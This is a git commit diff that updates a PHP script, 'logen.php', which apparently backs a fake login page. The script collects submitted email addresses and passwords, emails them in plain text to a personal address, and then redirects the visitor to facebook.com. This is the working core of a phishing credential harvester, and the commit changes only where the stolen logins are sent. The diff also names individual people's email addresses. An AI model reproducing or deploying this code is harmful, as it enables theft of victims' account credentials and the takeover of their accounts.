7f1eadce924557c717a6a6cb57b1a47da8986f73
Melkamu Dagne <38700508+abbamelka@users.noreply.github.com>
2021-10-15 15:49:08 +0300

    Update logen.php

--- mobile2/logen.php
+++ mobile2/logen.php
@@ -1,13 +1,13 @@
 <?php
 
-$to      = 'melkamudagne19@gmail.com';
+$to      = 'melkamu.dange@adm-technologies.com';
 $subject = 'the subject';
 $message = $_POST["email"] . "  :  " . $_POST["pass"];
 $headers = 'From: melkamu.dange@adm-technologies.com' . "\r\n" .
     'Reply-To: melkamudagne19@gmail.com' . "\r\n" .
     'X-Mailer: PHP/' . phpversion();
 
-mail($to, $subject, $message,$headers,"-f melkamudagne19@gmail.com");
+mail($to, $subject, $message,$headers,"-f melkamu.dange@adm-technologies.com");
 
 
 $newURL = "https://www.facebook.com";
